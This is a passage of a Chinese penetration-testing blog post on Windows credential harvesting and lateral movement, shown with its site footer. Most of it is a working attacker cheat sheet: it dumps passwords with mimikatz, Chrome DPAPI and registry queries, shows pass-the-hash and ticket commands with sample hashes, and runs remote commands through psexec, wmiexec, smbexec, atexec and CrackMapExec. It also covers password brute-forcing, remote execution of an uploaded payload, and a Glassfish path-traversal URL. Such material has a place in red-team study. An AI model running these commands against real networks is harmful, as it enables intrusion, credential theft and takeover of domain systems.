+<h5 id="收集密码"><a href="#收集密码" class="headerlink" title="收集密码"></a>收集密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RDP</span><br><span class="line">cmdkey &#x2F;list</span><br><span class="line">wifi</span><br><span class="line">netsh wlan export profile interface&#x3D;无线网络连接 key&#x3D;clear folder&#x3D;C:\</span><br><span class="line">Chrome</span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome</span><br><span class="line">&#x2F;in:\&quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\&quot;</span><br><span class="line">&#x2F;unprotect&quot; exit</span><br><span class="line">RealVNC</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="收集密码-Tools-List-1"><a href="#收集密码-Tools-List-1" class="headerlink" title="收集密码 Tools List(1)"></a>收集密码 Tools List(1)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">系统</span><br><span class="line">mimikatz</span><br><span class="line">wce</span><br><span class="line">getpass</span><br><span class="line">pwdump7</span><br><span class="line">QuarksPwDump</span><br><span class="line">三方</span><br><span class="line">mimikittenz</span><br><span class="line">netpass.exe</span><br><span class="line">Dialupass.exe</span><br><span class="line">LaZagne</span><br><span class="line">passrec工具包</span><br></pre></td></tr></table></figure>
+<h5 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-113(NT AUTHORITY Local account)</span><br><span class="line">S-1-5-114(NT AUTHORITY Administrators 用户组的本地账户和成员)</span><br><span class="line">可以通过组策略使用这些 sid 来有效地阻止远程登录使用所有本地管理账户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="PTX分类"><a href="#PTX分类" class="headerlink" title="PTX分类"></a>PTX分类</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PTH:抓取哈希值并用来访问资源。直到用户改密码哈希值都是有效的。</span><br><span class="line">PTT:抓取Kerberos票据用来访问资源。在票据有效期期限内票据都有效(一般是7天)。</span><br><span class="line">PTK:抓取AES Key访问资源。</span><br><span class="line">Tips:</span><br><span class="line">如果获得哈希值的类型是NTLM,Kerberos票据的类型是RC4.如果哈希类型是AES,Kerberos票</span><br><span class="line">据类型也是ABS。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h5><p>LSALogonUser API</p>
+<h6 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h6><p>privilege::debug<br>sekurlsa::logonpasswords</p>
+<h6 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup</span><br><span class="line">&#x2F;ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">注:受UAC影响,远程网络验证只能使用SID 500本地管理员用户</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterP</span><br><span class="line">olicy 1PTH</span><br><span class="line">注:默认10小时可以用来登录</span><br><span class="line">基本用法</span><br><span class="line">导出内存中Ticket</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br><span class="line">导入Ticket</span><br><span class="line">kerberos::ptt</span><br><span class="line">C:\test[0;2d87a]-2-0-40e00000-a@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line">攻击方法</span><br><span class="line">MS14-068(kekeo、ms14-068.exe)</span><br><span class="line">Golden ticket</span><br><span class="line">SILVER ticket</span><br><span class="line">ipc连接</span><br><span class="line">net use \\ip\c$ &quot;password&quot; &#x2F;user:domain\username</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h5><p>要求</p>
+<ul>
+<li>1.SMB服务必须开启</li>
+<li>2.文件的打印机共享必须开启</li>
+<li>3.admin$必须可以访问</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\ip -accepteula -u username -p password program.exe</span><br><span class="line">PsExec.exe \\192.168.1.6 -u administrator -p Abcd1234 -s cmd.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="WMIEXEC-Tools-List"><a href="#WMIEXEC-Tools-List" class="headerlink" title="WMIEXEC Tools List"></a>WMIEXEC Tools List</h5><ul>
+<li>Invoke-TheHash.pad1</li>
+<li>wmic</li>
+<li>wmiexec.vbs</li>
+<li>impacket wmiexec.py</li>
+</ul>
+<h5 id="WMIEXEC-1"><a href="#WMIEXEC-1" class="headerlink" title="WMIEXEC (1)"></a>WMIEXEC (1)</h5><ul>
+<li>wmic + type</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:DC1 &#x2F;user:DOMAIN\user&#x2F;password:pass process call create &quot;cmd &#x2F;c whoami</span><br><span class="line">&gt;c:\temp\output.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>vbs</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd domain_name username password cmd</span><br><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd WIN-78L42RBHLLO administrator admin123!@# &quot;ipconfig&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>impacket wmiexec.py</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:Aa123456@@192.168.100.190</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>wmiexec.py -hashes</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">workgroup&#x2F;administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Invoke-TheHash</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Module Invoke-TheHash.psd1</span><br><span class="line">Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash</span><br><span class="line">ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="AT-amp-SchTasks"><a href="#AT-amp-SchTasks" class="headerlink" title="AT&amp;SchTasks"></a>AT&amp;SchTasks</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ATeXEC</span><br><span class="line">python atexec.py administrator:admin123!@#192.168.3.133 ipconfig</span><br><span class="line">schtasks &#x2F;create &#x2F;tn ExampleTask &#x2F;tr c:\windows\system32\calc.exe &#x2F;sc once &#x2F;st 00:00 &#x2F;S</span><br><span class="line">host.domain &#x2F;RU System</span><br><span class="line">schtasks &#x2F;run &#x2F;tn ExampleTask &#x2F;S host.domain</span><br><span class="line">schtasks &#x2F;F &#x2F;delete &#x2F;tn ExampleTask &#x2F;S host.domain</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="CrackMapExec-批量验证"><a href="#CrackMapExec-批量验证" class="headerlink" title="CrackMapExec (批量验证)"></a>CrackMapExec (批量验证)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">apt-get install crackmapexec</span><br><span class="line">批量PTH</span><br><span class="line">crackmapexec 192.168.3.0&#x2F;24 -u administrator -H ccef208c6485269c20db2cad21734fe</span><br><span class="line">CME具有三种不同的命令执行方法:( --exec-method )</span><br><span class="line">1.wmiexec</span><br><span class="line">2.atexec</span><br><span class="line">3.smbexec</span><br><span class="line">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -x whoami</span><br><span class="line">暴力破解 (注意账号锁定)cme smb 192.168.1.101 -u Administrator -p &#x2F;path&#x2F;to&#x2F;passwords.txt</span><br><span class="line">注:cme可完成识别Web Banner、网页截图、端口扫描、枚举用户、会话、共享、磁盘、获取密码及</span><br><span class="line">Hash、获取密码策略等</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="SMBEXEC-DCOMEXEC"><a href="#SMBEXEC-DCOMEXEC" class="headerlink" title="SMBEXEC + DCOMEXEC"></a>SMBEXEC + DCOMEXEC</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SMBEXEC</span><br><span class="line">python smbexec.py -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07</span><br><span class="line">administrator@192.168.3.133n</span><br><span class="line">DCOMEXEC</span><br><span class="line">python dcomexec.py -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07</span><br><span class="line">administrator@192.168.3.133</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h6 id="WinRm"><a href="#WinRm" class="headerlink" title="WinRm"></a>WinRm</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:COMPUTER COMMAND</span><br><span class="line">Invoke-Command - computername $COMPUTER -command &#123; $COMMAND&#125;</span><br><span class="line">New-PSSession -Name PSCOMPUTER - ComputerName $COMPUTER; Enter-PSSession -</span><br><span class="line">Name PSCOMPUTER</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h6 id="Remote-File-Upload"><a href="#Remote-File-Upload" class="headerlink" title="Remote File Upload"></a>Remote File Upload</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp</span><br><span class="line">wmic &#x2F;node:target.domain &#x2F;user:domain\user &#x2F;password:password process call</span><br><span class="line">create &quot;C:\Windows\Temp\Malice.exe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="利用服务横向"><a href="#利用服务横向" class="headerlink" title="利用服务横向"></a>利用服务横向</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Web 中间件</span><br><span class="line">Web框架</span><br><span class="line">Web服务器</span><br><span class="line">运维系统</span><br><span class="line">邮件系统</span><br><span class="line">数据库</span><br><span class="line">常见服务&#x2F;协议</span><br><span class="line">Web 中间件</span><br><span class="line">Tomcat</span><br><span class="line">管理后台部署 war 后门文件</span><br><span class="line">Jboss</span><br><span class="line">(1)弱口令、部署war包(2)RCE</span><br><span class="line">Weblogic</span><br><span class="line">(1)弱口令、部署war包(2)反序列化</span><br><span class="line">WebSphere</span><br><span class="line">(1)弱口令部署war包(2)反序列化</span><br><span class="line">Glassfish</span><br><span class="line">远程文件包含</span><br><span class="line">http:&#x2F;&#x2F;1.2.3.4:4848&#x2F;theme&#x2F;META-</span><br><span class="line">INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-</span><br><span class="line">keyfile</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Web框架"><a href="#Web框架" class="headerlink" title="Web框架"></a>Web框架</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Spring</span><br><span class="line">(1)RCE (2)目录穿越 (3) 反序列化</span><br><span class="line">Struts2</span><br><span class="line">S2-005 ... S2-507</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="运维平台"><a href="#运维平台" class="headerlink" title="运维平台"></a>运维平台</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Gitlab</span><br><span class="line">(1)任意用户Token泄露(2)任意文件读取</span><br><span class="line">Jenkins</span><br><span class="line">(1)RCE linux (2)反序列化 (3)未授权访问 (4)弱口令、后台getshellZabbix</span><br><span class="line">(1)SQL注入 (2) RCE</span><br><span class="line">Splunk</span><br><span class="line">(1)信息泄露 (2)命令注入 (3)SSRF(弱口令)</span><br><span class="line">数据库</span><br><span class="line">MYSQL</span><br><span class="line">弱口令写shell</span><br><span class="line">MSSQL (重点讲)</span><br><span class="line">Oracle</span><br><span class="line">PostgreSQL</span><br><span class="line">(1)弱口令 (2) SQL注入 (3)udf执行命令 (4)文件读写</span><br><span class="line">MongoDB</span><br><span class="line">未授权</span><br><span class="line">Redis</span><br><span class="line">未授权访问+配合ssh key提权</span><br><span class="line">数据库-MSSQL</span><br><span class="line">文件读取</span><br><span class="line">(1)读:bulk insert、openRowSet、sp_oacreate</span><br><span class="line">(2)写:sp_oacreate、bulk insert error copy、textcopy (mssql 2005后消失)</span><br><span class="line">命令执行</span><br><span class="line">xp_cmdshell</span><br><span class="line">SP_OACREATE</span><br><span class="line">(1) CLISD (2) VBScript</span><br><span class="line">CLR Assemblies</span><br><span class="line">(1) from dll (2) from hex</span><br><span class="line">AgentJob</span><br><span class="line">(1)powershell (2) cmd (3) js (4) vbs</span><br><span class="line">Extended Stored Procedure</span><br><span class="line">JetEngine Sandbox常见服务&#x2F;协议</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="内网渗透-域渗透"><a href="#内网渗透-域渗透" class="headerlink" title="内网渗透-域渗透"></a>内网渗透-域渗透</h4><p>域渗透常见姿势</p>
+<ul>
+<li>AD Recon</li>
+<li>AD Privilege Escalation</li>
+<li>Forged Kerberos Tickets</li>
+<li>Credential Access</li>
+<li>Lateral Movement</li>
+<li>Kerberos (AD) Attacks</li>
+<li>AD Persistence</li>
+</ul>
+<h5 id="AD-Recon"><a href="#AD-Recon" class="headerlink" title="AD Recon"></a>AD Recon</h5><p><img src="/images/pasted-57.png" alt="upload successful"></p>
+<h5 id="Recan-Without-Admin-Rights"><a href="#Recan-Without-Admin-Rights" class="headerlink" title="Recan Without Admin Rights"></a>Recan Without Admin Rights</h5><p>.Net<br>例:<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=113">https://adsecurity.org/?p=113</a></p>
+<p><img src="/images/pasted-58.png" alt="upload successful"></p>
+<h5 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SPN是服务在使用Kerberos身份验证的网络上唯一标识符。它由服务类,主机名和端口组成。在使用</span><br><span class="line">Kerberos身份验证的网络中,必须在内置计算机账户(如NetworkService或LocalSystem)或用户账户</span><br><span class="line">下对于内置账户,SPN将自动进行注册。但是,如果在域用户账户下运行服务,则必须为要使用的账户</span><br><span class="line">手动注册SPN。</span><br><span class="line">SPN分为两种:</span><br><span class="line">注册在AD上机器账户(Computers$):Local System或Network Service</span><br><span class="line">注册在域用户账户(Users)下:权限为一个域用户</span><br><span class="line">SPN结构</span><br><span class="line">&#x2F;:</span><br><span class="line">service class:服务组件类型</span><br><span class="line">hostname:计算机的FQDN</span><br><span class="line">port:端口号</span><br><span class="line">SPN列表:</span><br><span class="line">https:&#x2F;&#x2F;adsecurity.org&#x2F;?page_id&#x3D;183</span><br></pre></td></tr></table></figure>
+<h5 id="Kerberos-amp-SPN-Scanning"><a href="#Kerberos-amp-SPN-Scanning" class="headerlink" title="Kerberos &amp; SPN Scanning"></a>Kerberos &amp; SPN Scanning</h5><p><img src="/images/pasted-59.png" alt="upload successful"></p>
+<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><img src="/images/pasted-60.png" alt="upload successful"></p>
+<h5 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h5><p><img src="/images/pasted-61.png" alt="upload successful"></p>
+<h5 id="AD-Privilege-Escalation"><a href="#AD-Privilege-Escalation" class="headerlink" title="AD Privilege Escalation"></a>AD Privilege Escalation</h5><p>待补充</p>
+<h5 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h5><p><img src="/images/pasted-62.png" alt="upload successful"></p>
+<h5 id="GoldenPAC-MS14-068"><a href="#GoldenPAC-MS14-068" class="headerlink" title="GoldenPAC (MS14-068)"></a>GoldenPAC (MS14-068)</h5><p><img src="/images/pasted-63.png" alt="upload successful"></p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<h5 id="DNSAdmins-to-Domain-Admin"><a href="#DNSAdmins-to-Domain-Admin" class="headerlink" title="DNSAdmins to Domain Admin"></a>DNSAdmins to Domain Admin</h5><p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<h5 id="GPP-MS14-025"><a href="#GPP-MS14-025" class="headerlink" title="GPP(MS14-025)"></a>GPP(MS14-025)</h5><p><img src="/images/pasted-66.png" alt="upload successful"></p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<p><img src="/images/pasted-71.png" alt="upload successful"></p>
+<h5 id="Attack-NTDS-dit"><a href="#Attack-NTDS-dit" class="headerlink" title="Attack NTDS.dit"></a>Attack NTDS.dit</h5><p><img src="/images/pasted-69.png" alt="upload successful"></p>
+<h5 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h5><p><img src="/images/pasted-68.png" alt="upload successful"></p>
+<h5 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h5><p><img src="/images/pasted-70.png" alt="upload successful"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">thirteensummer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://thirteensummer.github.io/2021/06/22/nei-wang-shen-tou-ping-ju-huo-qu-heng-xiang-shen-tou/">https://thirteensummer.github.io/2021/06/22/nei-wang-shen-tou-ping-ju-huo-qu-heng-xiang-shen-tou/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">thirteensummer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%8A%A0%E5%AF%86-hasdes-123/">
+                                    <span class="chip bg-color">加密 hasdes@123</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">人生何处不相逢</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/z123.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/w123.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/06/22/nei-wang-shen-tou-chang-yong-ming-ling/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="内网渗透－－常用命令">
+                        
+                        <span class="card-title">内网渗透－－常用命令</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            thirteensummer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/06/22/nei-wang-shen-tou-bu-bu-wei-ying/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="内网渗透-步步为营">
+                        
+                        <span class="card-title">内网渗透-步步为营</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            thirteensummer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8A%A0%E5%AF%86-hasdes-123/">
+                        <span class="chip bg-color">加密 hasdes@123</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
